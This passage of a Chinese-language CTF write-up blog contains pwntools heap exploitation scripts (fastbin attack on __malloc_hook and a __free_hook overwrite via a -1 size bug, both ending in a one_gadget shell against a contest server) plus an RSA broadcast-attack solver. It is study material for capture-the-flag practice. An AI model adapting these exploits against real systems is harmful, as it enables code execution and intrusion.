</span></span><span style=display:flex><span>def Show(index):
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;choice: &#34;,str(3))
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;id: &#34;,str(index))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Add(24,&#39;index:0\n&#39;)
</span></span><span style=display:flex><span>Add(48,&#39;index:1\n&#39;)
</span></span><span style=display:flex><span>Add(64,&#39;index:2\n&#39;)
</span></span><span style=display:flex><span>Add(16,&#39;index:3\n&#39;)#avoid top chunk
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Delete(0)
</span></span><span style=display:flex><span>Add(24,&#39;a&#39; * 24 + &#39;\x91&#39;)
</span></span><span style=display:flex><span>Delete(1)
</span></span><span style=display:flex><span>Add(48,&#39;\n&#39;)
</span></span><span style=display:flex><span>Show(1)
</span></span><span style=display:flex><span>sh.recvuntil(&#34;is &#34;)
</span></span><span style=display:flex><span>libc_base = u64(sh.recv(6).ljust(8,&#39;\x00&#39;)) - (0x3C4B20 + 0x80 + 88)
</span></span><span style=display:flex><span>log.success(&#39;libc_base:&#39; + hex(libc_base))
</span></span><span style=display:flex><span>malloc_hook = libc_base + libc.symbols[&#34;__malloc_hook&#34;]
</span></span><span style=display:flex><span>alloc_addr = malloc_hook - 0x23
</span></span><span style=display:flex><span>one_gadget = libc_base + 0x4527a
</span></span><span style=display:flex><span>realloc_addr = libc_base + 0x84720
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Add(0x40,&#39;index:4\n&#39;)
</span></span><span style=display:flex><span>Add(24,&#39;index:5\n&#39;)
</span></span><span style=display:flex><span>Add(16,&#39;index:6\n&#39;)
</span></span><span style=display:flex><span>Add(0x68,&#39;index:7\n&#39;)
</span></span><span style=display:flex><span>Add(16,&#39;index:8\n&#39;)#avoid top chunk
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Delete(7)
</span></span><span style=display:flex><span>Delete(5)
</span></span><span style=display:flex><span>Add(24,&#39;a&#39; * 24 + &#39;\x91&#39;)
</span></span><span style=display:flex><span>Delete(6)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload = &#39;a&#39; * 16 + p64(0) + p64(0x71) + p64(alloc_addr)
</span></span><span style=display:flex><span>Add(112,payload + &#39;\n&#39;)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Add(0x68,&#39;\n&#39;)
</span></span><span style=display:flex><span>Add(0x68,&#39;a&#39; * 0xB + p64(one_gadget) + p64(realloc_addr) + &#39;\n&#39;)
</span></span><span style=display:flex><span>sh.sendlineafter(&#34;choice: &#34;,str(1))
</span></span><span style=display:flex><span>sh.sendlineafter(&#34;title: &#34;,str(16))
</span></span><span style=display:flex><span>#Add(16,&#39;\n&#39;)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh.interactive()
</span></span></code></pre></div><h3 id=todolist2>todolist2</h3><p>看了许久没看出漏洞点，最后终于发现是在 read 函数里</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/1200345081.png></div><p>打个 -1 就可以随便输了。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#context(log_level = &#39;debug&#39;)</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#39;tmux&#39;</span>,<span style=color:#4070a0>&#39;splitw&#39;</span>,<span style=color:#4070a0>&#39;-h&#39;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./todolist2&#34;)</span>
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;182.92.108.71&#34;</span>,<span style=color:#40a070>30521</span>)
</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc-2.27.so&#34;</span>) 
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>take</span>(size):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;write?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(size))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>delete</span>(index):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;2&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;delete?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(index))
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>edit</span>(payload,index,size):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;3&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;edit?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(index))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;write?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(size))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>send(payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>show</span>(index):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;4&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;check?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(index))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x410</span>)<span style=color:#60a0b0;font-style:italic>#index:0</span>
</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x410</span>)<span style=color:#60a0b0;font-style:italic>#index:1</span>
</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x20</span>)<span style=color:#60a0b0;font-style:italic>#index:2</span>
</span></span><span style=display:flex><span>delete(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>delete(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x830</span>)<span style=color:#60a0b0;font-style:italic>#index:3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>show(<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> <span style=color:#40a070>0x3ebc40</span> <span style=color:#666>-</span> <span style=color:#40a070>96</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
</span></span><span style=display:flex><span>malloc_hook <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;__malloc_hook&#34;</span>]
</span></span><span style=display:flex><span>free_hook <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;__free_hook&#34;</span>]
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;malloc_hook:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(malloc_hook)) 
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;free_hook:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(free_hook)) 
</span></span><span style=display:flex><span>one_gadget <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x4f432</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;one_gadget:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(one_gadget))
</span></span><span style=display:flex><span><span style=color:#4070a0>&#39;&#39;&#39;----------- above dumped libc ----------&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x100</span>)<span style=color:#60a0b0;font-style:italic>#index:4</span>
</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x100</span>)<span style=color:#60a0b0;font-style:italic>#index:5</span>
</span></span><span style=display:flex><span>delete(<span style=color:#40a070>5</span>)
</span></span><span style=display:flex><span>edit(<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x100</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x111</span>) <span style=color:#666>+</span> p64(free_hook) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>,<span style=color:#40a070>4</span>,<span style=color:#666>-</span><span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#edit(&#39;a&#39; * 0x100 + p64(0) + p64(0x111) + p64(malloc_hook) + &#39;\n&#39;,4,-1)</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#edit(&#39;a&#39; * 0x100 + p64(0) + p64(0x111) + p64(malloc_hook - 0x10) + &#39;\n&#39;,4,-1)</span>
</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x100</span>)<span style=color:#60a0b0;font-style:italic>#index:6</span>
</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x100</span>)<span style=color:#60a0b0;font-style:italic>#index:7</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>realloc <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;__libc_realloc&#34;</span>]
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#payload = p64(one_gadget) + p64(realloc + 0xa)</span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> p64(one_gadget)
</span></span><span style=display:flex><span>edit(payload,<span style=color:#40a070>7</span>,<span style=color:#007020>len</span>(payload))
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#gdb.attach(proc.pidof(sh)[0])</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#take(0x200)</span>
</span></span><span style=display:flex><span>delete(<span style=color:#40a070>2</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
</span></span></code></pre></div><h2 id=crypto>Crypto</h2><h3 id=likiprime>LikiPrime</h3><p>先通过<a href=http://factordb.com/>这个网站</a>分解 $N$，然后通过 <code>RSA Tool 2 by tE</code> 直接解出 flag。</p><h3 id=happynewyear>HappyNewYear!!</h3><p>低指数广播攻击。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>from gmpy2 import*
</span></span><span style=display:flex><span>from libnum import *
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>def CRT(a,n):
</span></span><span style=display:flex><span>    sum = 0
</span></span><span style=display:flex><span>    N = reduce(lambda x,y:x*y,n)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    for n_i, a_i in zip(n,a):   
</span></span><span style=display:flex><span>        N_i = N // n_i  
</span></span><span style=display:flex><span>        sum += a_i*N_i*invert(N_i,n_i)
</span></span><span style=display:flex><span>    return sum % N 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ns = [
</span></span><span style=display:flex><span>768731284506327944113406236027267453153178504481960474163849413572959901900781941471060120664615036667721568236486104212543941626093683611820051956888999990409535944068510533828285247642295156383062225121123397420863524500301605790432399020453905305067131509497931914214431033157498386840010234482484177898191608673445690542041959091445418878375877435164674203776931738708624804301646179653019817596612876848617302959482364008286148292002918372774353441375602500755004724814787928356594079344361596836482525021434616271982920662313256530007883018720585047232121289721656963132683682023625683229940587959315583539720857557451681402228168096559968476948263356605729649774017109848808425693506724312264272613164411551780892434255749213128692122454364559986018251379167331425321803760454026945039856860491038669974395683809854790365463840636343980962376205540013015629307389934488725537142983815565534720739509012176887290320329127809218230756596181528831774086891633290341399153631178022171655153576793324046302349267421556220063264261739968103953460444018066381487941305190730721608513048181450127628562770702172658088836581698332318905758721984778545449145728049393279394785952324627362503706190204128637631213405674863660425389313259,
</span></span><span style=display:flex><span>524955549822701108820249448341549471789542970374297220719644144467046120999708435027269809717491708384591502747843811858599256578006152409861521624800414221049434790169883523654257416906811451131195855586244598374880878692418389200238536952258677438654818096236001665540878733993916070969439309600669058216532381285131220090854384696479702333190547690812990714884526122724065211294733252863353053612662498096532976972273019631446622835704720241172866721075241553118399444619649756067546482948914446034527197029043296867226467390140262361175465932673129685497666662167082114259368591713670044469780955810420060714389043507570707061129150071885165680539302629323340904857078380746639406842784054066196290404127562974351550470732956889057701068241533469665269708040337792974792839671609064624273734488264409908037327963582749939131119285299618565955038449080047185142908091099286222071106259434530841587125509988124634728986309920606439740930811537598857558982632237868734857663853645411122621117175983417162818791869180350737709034243602399686004808133116046260847513863100560285962053110278579574895754928960943506584372424062481234806423574610837438057911596190771344568064718882123247708570545980147637910744997312960997877114875563,
</span></span><span style=display:flex><span>531816715051067911629200567254640608407895151120321915934223550416084055941810057275647124365372164691799815654324843152835621657219143971510794565282438719132189708357084269561390602533348667210778967547331570345307713271797500472800693615897738386357322760213782607288672639158771643480519455699144535885754570631972814751649211026584146963569748660071519399459076694805787216533150149579905553101555997182221446716574345192297201707280470099673168021522276021573255431147391095907444654303966368362618307277890450431646680417082866906543559655835992081835168319097576418799442472634041439781110915814527860626840035884588953837943723302497813966476632638781785524454419556109443369209786353302330932241171298568309190081206636347720214268688100661670856945137179076232753814259674913102806389336950363047338944420468292248719856587641014569194752277829684619803918722245724677129232358305719548783148527753735258295780607510739074337299037254055287750082818921964088131910307180760939784520021579399465657665634960365680711736311232219221704752502361047780644838828947578962833367751773943513294960723081845674700714114613905708967183234219078662548527491691822238226973730089750314606177285702898595711912716069746542235493085749,
</span></span><span style=display:flex><span>493772253520028701228394073791118796898860642546293517165976340880188671501170757992157937835809864375957661380376149183362237960714624594301301578885724183490678033704978135608268473206365825232902155458695063561942608980565675676060170247587203833300205781482210306978615656217675258493239504539762213919984146477146352995349444904282648001338541091894423167804984256356783623092953892148062097076194840351505254447228339051915162949343535017563167413299991340194548813782360554779507722510592683811398509607473468601404587617569337150824778600883884616204746234575349549906287741463102675096118386062231492163458668021511751022439191080507345540921839703382290445797046739813648289321292589201149955672085687445193343364105492343611293348540598587286909499000234416955201612299458282688515658596600656417554161895812046994316423241245289735327450704642000340929459813500971266436908790234452643087694195334024560701562917342963860276789458845939794177422833059051673483227332372905969868740556412782843128761060670334188293944421019131514119696008065850631880588123929581097844255625593530935229341774189341909782979667383762706038731196861300615117475933625813147094849135055190312732335084507955724604696171453417718094964090327,
</span></span><span style=display:flex><span>400814713999150053337202998177245797185153318108582661287579898596310746501291974666347785576673046001863500878959207830917744556274546158919815600936114953314600540036576429657582500764669413652252770861966417840099061248948771555745832102924038855172611675048290264202872791337710865213077945592130795851795718608065812757968780578674701063411377538597424177722558867587781141897676300153523209675996201871155481412772845570976807158049274849081684209479884845355028703657648486318475977716075670243766212910039942550957289189946628261360037565354423094972917371572096203537186108596979722712819213554550645058717286550110465343100499845761528635976859006285823914211739843983972560292482778326983903018873698437828016668821516581220588836782094261582899393704029819851484331592269664479855215056764839779582417486366182524483986373098489636334412671358130389579972838029202609936524996601129648191606117951616875200119129837212604760319073283133589692257497994855882819655018727368441361317788278857721179085847352853038553208639836433059097775135452611114351766229800268321281856140246610438246783364320786390657242414430601000831387967976691362673290089725234013924339500819390840062916754623424132621350706544122257464089409619,
</span></span><span style=display:flex><span>441219832102329113941862838660943233579215441091346336934528023475304109965596676163440394813272558320918420480386749091947802455423402857125233908206867132599069595323243154174569298961794344623241293553421864069389535348543832297805982907650367142721566803315107733852453608111246057981064164247187640480712312060234169292599096087422940380874435851795847673883946134398943282297673922785786134668939454715179979246505182510338437251221569074780060511794395438999419581907256239694239236674604727404688764447352994022067990843174130240669289888289862268588307778029283493265348667415910553064457513926134377522099641209108448559373422305901757344324758407462166774699512993336120173336911210734744313930970281023299709778006083933174113456436965150432387778607639217894522770756209157735203091790545289813873886244335031912734705230434179583023235199153300263399767468586679972093973609985111254951924071949408463935260725701129931726900345186925871556853670570762826122383762006869109981003180805851519716186506371242901187230433096494812063568936279012557322219782284461140361225650340807095328622016565443274256310194921729305097890315074292153303546235677671541793456589738387043928232044507842169173330728718482770626654501523,
</span></span><span style=display:flex><span>320869957563788427035277998523618265705625973417036901203569472342030237447625011870979141578128136960129467546914523329260071050471008896398606988171189642059908517956020915451465313985689287777861360309556861849062064900403692083060786557290591231962941942100771713703136018889848261749140840347546977823595556802430254803837030344591646012857122213227115215674470388548652140381296705772500445572224924018905225174265663584819356114341255408979866800339484643585303306817447453000684770518093577661102544212109378828711785073514863402442870264355300371516683912671007573320059261257897651899697566804513319774954294708303168788292037857134628186553450976637858562675039807897112079750384830264618639239956765667388939331303314191813126254254914926384279494115576997773080256600900034563434959593677148531401160281960526061723479161754555193979726656961515374019212153726594807142456303698775715290518062768887156433902187122160641097916121097179118289646514217696314956474472626420868486152421013284784863653299930875253371982327367991139126828286729539033382650687859412868137579309775440698502848241122394423129771442338402870863767769545005951064956498742874485207824630520777152431261010818838138655082911865834699807375008861]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cs = [
</span></span><span style=display:flex><span>722725267571877807402319081826628305252544883884335241258703688920929757984818470073041479840921480077113183869560758029121565524819466778712481183488277905449328223533043391590093655773827799575075615676500130199172201779452716348108026696828323022993975174610207567571651550333881731147356813019258889551558181283524226640533248278854011492561134943798149661873706769482776061146298693713915393175945083367889987571681776927122583376239974702806044792299381370488664195802017823240811394180509440609967345141141653389746431284893972530735438955464348280960825325776483554008537527538106398207335688261344254017151889931214151508915480961509920681364352778795068266724879364096996252272841617341643666522563974346452491302969822483901472736908002176995244808285202644542949151920310938882432565101197174787422479197405599503943928375781580538374853471395003088467545128060029187794431891563377967647568991772201040537299188867383732391802781253804314567562657951501684710262276597091279719861829006628377575073875781088939946651128183090724290607438597560193321130496240482260573568646971658130695308585240404956802017929673317521572608385674052894773447205932790060730005333539795323555614705817665786476411351969424168366962370578,
</span></span><span style=display:flex><span>341106636902364624537621803937059683829500847731737217024477947229102117868841270816391462580424161421481323287279560344771837711680149251407621544732737892160496443939357041950388493554496406007658435517211507967374859158779641371713073809459356957664870385022506283994639885012608754343497740963582877475346528865751238785898641641562644419639994889039921662499512792397994326679297072288344988329863729467521185656908541750681614296631331948235836697947639517519093825102735706418368162081693311580728579264440449951888361065347124447876814670051679652280281965491150266115964128635848848265679743499256971016535195477416889144131600175159747033626985115139696085153828051183257884668367446309997650590293659781294222777784435987334384194429993199873061206563903159227361936901013994702046575677089263288115905540761147293222721696340819505305497691052766999798297905368576684359681315851605714974267829409740228043899512270242579080482164570677517245195783188509338962785491871370414414487565392656794817257748899014632689366928706013426731920865802714147114118673053353872356444566840336431784793686607763099763915943769968162453433779091468653936247489610842351714130350853888962620401435016019892000066519489369586647822582532,
</span></span><span style=display:flex><span>96655501480984228476843527875038148766862682735216531181731365068856421448884071634422050543257015201836409006098564512948671369804995159104827331853700167554494548064655395947790619030027666553546707921275511050067552520015915189711919816240838635843727117678456359153157042256845391879627204005136329626204082446757707275024018932620919979573721462329490962992796317057293975350138690301006093906543825995442041881912668467639058815752449994459671712370905576936766284703593791336731603543492278087975208438906947966054673189424532474872122585340933934837935650393646216239318131268109344918651250925428018278665569580645117439459587437729735009669592816057201053074978283319149894796397333902672858475161613255814596817201545193202169499144055305358584644635503323032680354835638327999633796089419073741897835010300917603325122563734141907765815188906909017245236242853269976816696795439826925876239600449014662736919205840699787188466436497530759889271878272675511804209502453822900397006767975864334707665149166220819464748535531766670263050223009402082194467219438612279935716319300498861153496030333202808928006701019408354471055774090532330704743753190920815655232618981877529057446430825964256948001465214314349394508264556,
</span></span><span style=display:flex><span>357103586677133190400275535608298307096755517917743991779928165944808156555143364562652658318257441161780966754082431346703420213047464905801347987429587866507784835294289240703319363713980965945263022810877492245609589053923882000898807593180841308987573262209122953930711801088265031627560104571585260900206878593365521048031056818241791513449270437055503002833594299287048995560742435886215547766657105383700364572345248814440024509278757886084274494794572349604428103225636768278633773471700470592729438598821712944805975639637427494951822994991131521067141611563925956037672180261640035716517421681741527507431981163704929952037747170161617798150545493396732644456871805542270699764392127056902381387198947947443962667595072777104565429494042828509588406057498452896606672079600318076629291832964611485077778334984817595747726526804076306703817160053516530370696172218743746676413884784385108888108803420106818173901070897426014100110652172248635456173774009497111567782846079335233333617278837527467186444919584161474044529784043912893406555209016056689227249614906221138535989446685926185643604698806909451119908925728900998397084501277736148437741526619184826982588354997162924650747731826227150677994598866694976617038952960,
</span></span><span style=display:flex><span>196373383105902290020944815248115178565096789884585292930623716947035208071024597949093015291460459688039044997141326097130071826293844614603464306742597764422862382005497313400758917851620553757103374309501021075747571843057781165101330819142446088116279098633113721577451389062207713330184173913814679087349450078308520703743712617560764419518421118924319893700795437644204733301627193873115633309760620284510790535125035058821049861371456491148507101291075161477427293354824377765129256775039894591945559511120167575652522441315757824060660730144970842971698502722588421031575495602989132763560631831054650312859575883607799879434734827000150732042760623153837096529339041007718789464168455505957010471222861988485628012999068075964645262827332446865072284660213544453081529030572364389186506108110484311864485900432885752933720505418233626286434177587041376262805920492740865402092716512672643242061407641167432424410178764502786772854859640601859309316626050634279758623225955757842810086544305493826555445120223896047747445754110537277236254307766447437586975157089685397827540671890607699289450588156013811091193850313213188596446595791898264003078214830341703064110270245588623025485564465677065014954050674151068209958156338,
</span></span><span style=display:flex><span>343558577020588714429313020041093297550600511001840154137552216575748946157961591099597309730875847249609067088895567357040752583678766229661761073029178667941759812656095394713728367061506713413650132129245164858512061430944849306322427733297033654152161512931139895523891447055784674776356336721195602898082264703411052396223706491835615239898963965039349867576628181946954585002705252796231016445166027513456849060948360498081892030697906086173612576083651879166491789946438067179662219651062279317002050789871120333850272751224872129535742685201837098575125361312611392050300073462884046822571642883949673321736837838379514540827860219307938135197101094531402063240331559853201121385391076154875363696159228373299490035401297769928627372721885488091110000395742964536445855367746227395783716581955884641531132839080847770052153020914740561915612109449417203852452084551679817129684835596664222472806271699238429017096741164052056835664191547244480985004136162585874727015248038703376279042870253365410963230937309995702792020342080115661150163434949942290275789227674559517957243060077741816736950124894466197373209308598030218454826136754312091821659566499445097655483610010997986426784494466843809743836689209926943448276851733,
</span></span><span style=display:flex><span>78140898568960172537532399957542065079754785608196175653725188831315142763849427144477433109881196560183622027227087954674199188991855929146336784979764720497547685824735751948676073196869027199411668951578490599507331800328072699193016348570092942269398714025948091737017548105562834031699831877517521836116912407428829037729994348603578694187241194587650053966682616443757430366693816438822541572320426819962696790047344705617241989403482962642561340363553100861232083902828830416053526478120239416765009622649261419311221132287115995483736302156498238644085182807103157307755108774079839474373171678479879270772376918459752331416572057373104068315516826270820079207687778179443170979119272546974948398836020966295976732842161084596604333609962435508857188202619164351406760248161996398928399808794165750688251550333360521545271424876496939865803880625334341137443221883906301968050670219384464251470416581899246708055363762134459566859899715206435140188997349196902765578570516978378759650864568014586614460583304460504318729333658817066272120984875742815218722200593432648242043375439670923950493477821363923796229165231700852653002648050645561521640741356788087870305958215222979881662007309583380284362915245390595921375463156
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>for i in range(0,7):
</span></span><span style=display:flex><span>    for j in range(i + 1,7):
</span></span><span style=display:flex><span>        for k in range(j + 1,7):
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            e=3
</span></span><span style=display:flex><span>            n1 = ns[i]
</span></span><span style=display:flex><span>            c1 = cs[i]
</span></span><span style=display:flex><span>            n2 = ns[j]
</span></span><span style=display:flex><span>            c2 = cs[j]
</span></span><span style=display:flex><span>            n3 = ns[k]
</span></span><span style=display:flex><span>            c3 = cs[k]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            n =[n1,n2,n3] 
</span></span><span style=display:flex><span>            c =[c1,c2,c3]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            x = CRT(c,n)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            m = iroot(x,e)[0]
</span></span><span style=display:flex><span>            print(n2s(m))
</span></span></code></pre></div><p>可以找到两个片段，拼起来就可以了。</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li><li><a href=/tags/hctf-game>hctf-game</a></li></ul></nav></div><script src=https://giscus.app/client.js data-repo=chujDK/chujdk.github.io data-repo-id=R_kgDOI__mNg data-category=Announcements data-category-id=DIC_kwDOI__mNs4CYoyP data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
<a class=border></a><a class=soc href=https://twitter.com/chujdk rel=me title=Twitter><i data-feather=twitter></i></a>
<a class=border></a><a class=soc href=mailto:chujj31@gmail.com rel=me title=Mail><i data-feather=mail></i></a>
<a class=border></a></div><div class=footer-info>&nbsp2020 ~ 2023  © chuj |  Based on <a href=https://github.com/athul/archie>Archie</a> | Built with <a href=https://gohugo.io>Hugo</a> | <a href=#>Goto Top</a></div></footer><script>feather.replace()</script></div></body></html>